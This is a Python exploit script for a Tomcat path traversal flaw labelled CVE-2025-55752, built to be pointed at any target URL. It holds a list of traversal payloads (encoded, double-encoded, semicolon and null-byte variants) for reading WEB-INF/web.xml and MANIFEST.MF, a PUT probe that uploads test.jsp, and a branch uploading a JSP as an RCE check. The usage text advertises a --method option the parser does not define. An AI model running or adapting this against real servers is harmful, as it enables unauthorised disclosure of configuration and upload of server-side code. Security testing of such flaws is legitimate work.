#!/usr/bin/env python3

"""
CVE-2025-55752 Tomcat Path Traversal Exploit
Demonstrates path traversal vulnerability through URL rewriting

Usage:
    python3 CVE-2025-55752.py --url http://localhost:8080 [--payload PAYLOAD] [--method PUT]
"""

import requests
import argparse
import sys
import urllib.parse
from pathlib import Path
from typing import Optional, Tuple
import json

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class CVE202555752Exploit:
    """Exploit for CVE-2025-55752 Tomcat Path Traversal"""

    def __init__(self, target_url: str, verify_ssl: bool = False):
        self.target_url = target_url.rstrip('/')
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.results = []

    def test_basic_request(self) -> bool:
        """Test basic connectivity to the target"""
        try:
            response = self.session.get(
                f"{self.target_url}/",
                timeout=5,
                verify=self.verify_ssl
            )
            return response.status_code < 500
        except Exception as e:
            print(f"[ERROR] Failed to connect: {e}")
            return False

    def generate_payloads(self) -> list:
        """Generate various path traversal payloads"""
        payloads = [
            # Basic traversal
            "/api/../WEB-INF/web.xml",
            "/api/..\\WEB-INF\\web.xml",
            "/api/..;/WEB-INF/web.xml",

            # URL-encoded variations
            "/api/..%2fWEB-INF%2fweb.xml",
            "/api/%2e%2e/WEB-INF/web.xml",
            "/api/%2e%2e%2fWEB-INF%2fweb.xml",

            # Double-encoded
            "/api/%252e%252e%252fWEB-INF%252fweb.xml",

            # Multiple traversals
            "/api/../../WEB-INF/web.xml",
            "/api/../../../WEB-INF/web.xml",

            # Meta-INF
            "/api/../META-INF/MANIFEST.MF",
            "/api/..%2fMETA-INF%2fMANIFEST.MF",

            # Alternative encodings
            "/api/..%3fWEB-INF%3fweb.xml",
            "/api/..%3bWEB-INF%3bweb.xml",

            # Case variation
            "/api/..%2FWEB-INF%2Fweb.xml",
            "/api/..%2fweb-inf%2fweb.xml",

            # Null byte injection
            "/api/..%00/WEB-INF/web.xml",
            "/api/..%2f%00WEB-INF%2fweb.xml",
        ]
        return payloads

    def test_path_traversal(self, payload: str, method: str = "GET") -> Tuple[int, str, bool]:
        """
        Test a specific path traversal payload

        Returns:
            Tuple of (status_code, response_length, is_vulnerable)
        """
        try:
            url = f"{self.target_url}{payload}"

            if method == "GET":
                response = self.session.get(
                    url,
                    timeout=5,
                    verify=self.verify_ssl,
                    allow_redirects=False
                )
            elif method == "PUT":
                payload_content = (
                    '<%@ page import="java.io.*" %>'
                    '<% out.println("RCE Successful"); %>'
                )
                response = self.session.put(
                    url,
                    data=payload_content,
                    timeout=5,
                    verify=self.verify_ssl,
                    allow_redirects=False
                )
            else:
                return 0, "", False

            # Check if response contains indicators of successful traversal
            vulnerable = False
            if response.status_code == 200:
                # Check for web.xml or MANIFEST.MF content
                if b"web-app" in response.content or b"Manifest" in response.content:
                    vulnerable = True

            return response.status_code, str(len(response.content)), vulnerable

        except Exception as e:
            return 0, str(e), False

    def test_put_method(self) -> Optional[int]:
        """Test if PUT method is enabled"""
        try:
            response = self.session.put(
                f"{self.target_url}/test.jsp",
                data="test",
                timeout=5,
                verify=self.verify_ssl,
                allow_redirects=False
            )
            # Status 201 (Created) or 204 (No Content) indicates PUT is allowed
            return response.status_code
        except Exception:
            return None

    def run_tests(self) -> dict:
        """Run all exploitation tests"""
        print(f"\n{'='*70}")
        print(f"CVE-2025-55752 Tomcat Path Traversal Vulnerability Test")
        print(f"Target: {self.target_url}")
        print(f"{'='*70}\n")

        # Test connectivity
        print("[*] Testing connectivity...")
        if not self.test_basic_request():
            print("[!] Failed to connect to target")
            return {}

        print("[+] Target is reachable\n")

        # Test PUT method
        print("[*] Testing PUT method support...")
        put_status = self.test_put_method()
        if put_status and put_status < 400:
            print(f"[!] PUT method is ENABLED (Status: {put_status})")
            print("    [!] High Risk: RCE possible through file upload\n")
        else:
            print(f"[+] PUT method is disabled or protected\n")

        # Run payload tests
        print("[*] Testing path traversal payloads...\n")
        print(f"{'Payload':<50} {'Status':<8} {'Size':<10} {'Result':<12}")
        print("-" * 80)

        payloads = self.generate_payloads()
        vulnerable_payloads = []

        for payload in payloads:
            status, size, is_vulnerable = self.test_path_traversal(payload)
            result = "VULNERABLE" if is_vulnerable else "Safe"

            print(f"{payload:<50} {status:<8} {size:<10} {result:<12}")

            if is_vulnerable:
                vulnerable_payloads.append(payload)
                self.results.append({
                    "payload": payload,
                    "status": status,
                    "response_size": size,
                    "vulnerable": True
                })

        print("-" * 80 + "\n")

        # Summary
        summary = {
            "target": self.target_url,
            "total_payloads_tested": len(payloads),
            "vulnerable_payloads": len(vulnerable_payloads),
            "put_enabled": put_status and put_status < 400,
            "vulnerable_paths": vulnerable_payloads,
            "detailed_results": self.results
        }

        print(f"[*] Summary:")
        print(f"    Total payloads tested: {summary['total_payloads_tested']}")
        print(f"    Vulnerable payloads: {summary['vulnerable_payloads']}")
        print(f"    PUT method enabled: {summary['put_enabled']}")

        if vulnerable_payloads:
            print(f"\n[!] VULNERABILITY CONFIRMED!")
            print(f"    Successful payloads:")
            for payload in vulnerable_payloads:
                print(f"      - {payload}")

        return summary


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-55752 Tomcat Path Traversal Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 CVE-2025-55752.py --url http://localhost:8080
  python3 CVE-2025-55752.py --url https://target.com --payload "/api/../WEB-INF/web.xml"
  python3 CVE-2025-55752.py --url http://target.com --verify-ssl
        """
    )

    parser.add_argument(
        "--url",
        required=True,
        help="Target URL (e.g., http://localhost:8080)"
    )
    parser.add_argument(
        "--payload",
        help="Specific payload to test (optional)"
    )
    parser.add_argument(
        "--verify-ssl",
        action="store_true",
        help="Verify SSL certificate"
    )
    parser.add_argument(
        "--output",
        help="Save results to JSON file"
    )

    args = parser.parse_args()

    exploit = CVE202555752Exploit(args.url, verify_ssl=args.verify_ssl)

    if args.payload:
        # Test specific payload
        status, size, is_vulnerable = exploit.test_path_traversal(args.payload)
        print(f"Payload: {args.payload}")
        print(f"Status: {status}")
        print(f"Vulnerable: {is_vulnerable}")
    else:
        # Run full test suite
        results = exploit.run_tests()

        if args.output:
            with open(args.output, 'w') as f:
                json.dump(results, f, indent=2)
            print(f"[+] Results saved to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())